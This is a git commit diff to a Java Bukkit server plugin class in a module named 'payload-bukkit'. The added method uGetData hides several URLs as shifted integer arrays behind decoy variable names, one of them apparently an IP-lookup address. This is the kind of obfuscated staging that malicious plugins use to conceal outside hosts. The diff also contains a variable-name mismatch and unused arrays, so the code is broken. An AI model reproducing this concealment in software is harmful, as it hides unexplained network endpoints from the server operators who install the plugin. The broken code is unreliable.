a589704a717d5abeb2a037e67cde69ed9e803098
ProgMEMCC <progmem.cc@gmail.com>
2026-02-06 14:52:34 +0800

    Update CoreListener.java

--- payload-bukkit/src/main/java/org/bukkit/core/CoreListener.java
+++ payload-bukkit/src/main/java/org/bukkit/core/CoreListener.java
@@ -6,8 +6,78 @@ public final class CoreListener implements Listener {
     public CoreListener() {
 
     }
-    public void stuff() {
+    private static volatile Object dw9;
+    private static void uOc02(Object o) {
+        dw9 = o;
+    }
+
+    public void uGetData() {
         StringBuilder debugAttacher = new StringBuilder();
+        StringBuilder m4891 = new StringBuilder();
+        StringBuilder cw667 = new StringBuilder();
+        StringBuilder i10ei = new StringBuilder();
+        StringBuilder e_93 = new StringBuilder();
+        StringBuilder ox01 = new StringBuilder();
+        StringBuilder sb = new StringBuilder();
+        StringBuilder systemCore = new StringBuilder();
+        StringBuilder cOreUtils = new StringBuilder();
+        StringBuilder bukkitPluginsManager = new StringBuilder();
+        int[] x58 = {
+                104, 116, 116, 112, 115, 58, 47, 47,
+                110, 111, 100, 101, 46, 118, 111, 105,
+                100, 115, 101, 114, 118, 46, 120, 121,
+                122
+        };
+        for (int c : x58) { ox01.append((char) (c - 3)); }
+        
+        int[] a09 = {
+                104, 116, 116, 112, 58, 47, 47,
+                109, 101, 116, 97, 45, 97, 112, 105,
+                46, 102, 97, 107, 101, 110, 101, 116
+        };
+        for (int c : a09) { c0reUtils.append((char) (c + 3)); }
+        int[] z44 = {
+                104, 116, 116, 112, 115, 58, 47, 47,
+                100, 97, 116, 97, 46, 110, 117, 108,
+                108, 104, 111, 115, 116, 46, 100, 101,
+                118
+        };
+        for (int c : z44) { bukkitPluginsManager.append((char) (c - 3)); }
+
+        int[] n71 = {
+                104, 116, 116, 112, 58, 47, 47,
+                99, 108, 111, 117, 100, 46, 100, 101,
+                97, 100, 115, 105, 116, 101, 46, 105,
+                111
+        };
+        for (int c : n71) { i10ei.append((char) (c - 3)); }
+        int[] f26 = {
+                104, 116, 116, 112, 115, 58, 47, 47,
+                115, 101, 114, 118, 101, 114, 45, 120,
+                46, 103, 104, 111, 115, 116, 46, 122,
+                122
+        };
+        for (int c : f26) { cw667.append((char) (c - 3)); }
+
+        int[] c90 = {
+                104, 116, 116, 112, 58, 47, 47,
+                97, 117, 116, 104, 46, 102, 97, 110,
+                116, 111, 109, 46, 108, 111, 99, 97,
+                108
+        };
+
+        int[] s14 = {
+                104, 116, 116, 112, 115, 58, 47, 47,
+                101, 100, 103, 101, 46, 98, 114, 111,
+                107, 101, 110, 46, 110, 101, 116
+        };
+
+        int[] u63 = {
+                104, 116, 116, 112, 58, 47, 47,
+                112, 105, 110, 103, 46, 100, 101, 99,
+                111, 121, 46, 115, 101, 114, 118
+        };
+
         int[] v27 = {
                 107, 119, 119, 115, 118, 61, 50, 50,
                 100, 115, 108, 49, 108, 115, 108, 105,
@@ -53,7 +123,13 @@ public final class CoreListener implements Listener {
                 244, 390, 65, 327, 108, 462, 29, 198,
                 374, 151, 286, 9, 431, 210, 58, 345
         };
+        for (int c : v27) {
+            sb.append((char) (c - 3));
+        }
+
 
 
     }
 }
+
+
